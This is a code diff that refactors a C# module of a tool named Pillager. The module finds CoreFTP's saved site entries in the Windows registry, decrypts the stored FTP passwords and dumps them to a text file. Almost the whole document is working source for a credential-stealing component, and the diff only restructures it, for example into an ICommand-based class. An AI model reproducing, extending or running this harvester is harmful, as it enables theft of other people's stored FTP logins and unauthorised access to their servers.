@@ -1,21 +1,16 @@
 ﻿using Microsoft.Win32;
+using Pillager.Helper;
 using System;
-using System.Collections.Generic;
 using System.Globalization;
 using System.IO;
-using System.Linq;
-using System.Runtime.Remoting.Channels;
 using System.Security.Cryptography;
-using System.Security.Principal;
 using System.Text;
 
 namespace Pillager.FTPs
 {
-    internal class CoreFTP
+    internal class CoreFTP : ICommand
     {
-        public static string FTPName = "CoreFTP";
-
-        public static string GetInfo()
+        public string GetInfo()
         {
             StringBuilder sb = new StringBuilder();
             string rkPath = "Software\\FTPWare\\CoreFTP\\Sites";
@@ -45,7 +40,7 @@ namespace Pillager.FTPs
             return sb.ToString();
         }
 
-        private static string Decrypt(string encryptedData, string key)
+        private string Decrypt(string encryptedData, string key)
         {
             byte[] array = Encoding.UTF8.GetBytes(key);
             PadToMultipleOf(ref array, 8);
@@ -66,13 +61,13 @@ namespace Pillager.FTPs
             return text;
         }
 
-        private static void PadToMultipleOf(ref byte[] src, int pad)
+        private void PadToMultipleOf(ref byte[] src, int pad)
         {
             int num = (src.Length + pad - 1) / pad * pad;
             Array.Resize(ref src, num);
         }
 
-        private static byte[] ConvertHexStringToByteArray(string hexString)
+        private byte[] ConvertHexStringToByteArray(string hexString)
         {
             if (hexString.Length % 2 != 0)
             {
@@ -87,16 +82,16 @@ namespace Pillager.FTPs
             return array;
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 string output = GetInfo();
                 if (!string.IsNullOrEmpty(output))
                 {
-                    string savepath = Path.Combine(path, FTPName);
+                    string savepath = Path.Combine(path, "CoreFTP");
                     Directory.CreateDirectory(savepath);
-                    File.WriteAllText(Path.Combine(savepath, FTPName + ".txt"), output);
+                    File.WriteAllText(Path.Combine(savepath, "CoreFTP.txt"), output, Encoding.UTF8);
                 }
             }
             catch { }
